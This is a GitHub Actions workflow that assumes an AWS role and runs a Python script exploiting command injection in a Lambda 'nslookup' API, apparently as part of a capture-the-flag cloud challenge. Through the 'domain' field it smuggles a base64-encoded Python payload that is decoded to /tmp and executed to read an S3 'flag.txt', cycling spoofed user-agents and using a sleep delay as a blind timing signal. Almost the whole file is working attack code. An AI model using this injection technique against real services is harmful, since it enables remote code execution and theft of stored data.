name: Stage2-S3-UA-Probe

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Probe Lambda S3 access
        shell: bash
        run: |
          set +e

          python3 -m pip install boto3 requests requests-aws4auth --quiet

          python3 - <<'PY'
          import base64
          import shlex
          import time
          import requests
          import boto3
          from requests_aws4auth import AWS4Auth

          API = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
          BUCKET = "userad88e2b168aa387e"
          KEY = "flag.txt"

          uas = [
              "Amazon CloudFront",
              "CloudFront",
              "Mozilla/5.0",
              "AWSLambda",
              "AWS_Lambda_python3.13",
              "aws-sdk-python",
              "Boto3",
              "botocore",
              "aws-cli",
              "python-urllib",
              "lambdaRole",
              "nslookupv2",
              "CloudEscape",
              "corgi",
              "REDACTED"
          ]

          inner = r'''
          import sys
          import urllib.request

          url = sys.argv[1]
          ua = sys.argv[2]

          request = urllib.request.Request(
              url,
              headers={"User-Agent": ua}
          )

          with urllib.request.urlopen(request, timeout=10) as response:
              data = response.read()

          print("READ_OK")
          print("BYTES=" + str(len(data)))
          '''

          encoded = base64.b64encode(inner.encode()).decode()

          credentials = boto3.Session().get_credentials().get_frozen_credentials()

          auth = AWS4Auth(
              credentials.access_key,
              credentials.secret_key,
              "us-east-1",
              "execute-api",
              session_token=credentials.token
          )

          s3_url = (
              "https://s3.us-east-1.amazonaws.com/"
              + BUCKET
              + "/"
              + KEY
          )

          for ua in uas:
              command = (
                  "printf '%s' "
                  + shlex.quote(encoded)
                  + " | base64 -d > /tmp/s3_probe.py; "
                  + "python3 /tmp/s3_probe.py "
                  + shlex.quote(s3_url)
                  + " "
                  + shlex.quote(ua)
                  + " && sleep 8; #"
              )

              started = time.monotonic()

              try:
                  response = requests.post(
                      API,
                      json={"domain": command},
                      auth=auth,
                      timeout=30
                  )

                  elapsed = time.monotonic() - started

                  print("UA=" + ua)
                  print("HTTP=" + str(response.status_code))
                  print("ELAPSED=%.2f" % elapsed)
                  print("---")

              except Exception as error:
                  elapsed = time.monotonic() - started
                  print("UA=" + ua)
                  print("ERROR=" + repr(error))
                  print("ELAPSED=%.2f" % elapsed)
                  print("---")
          PY
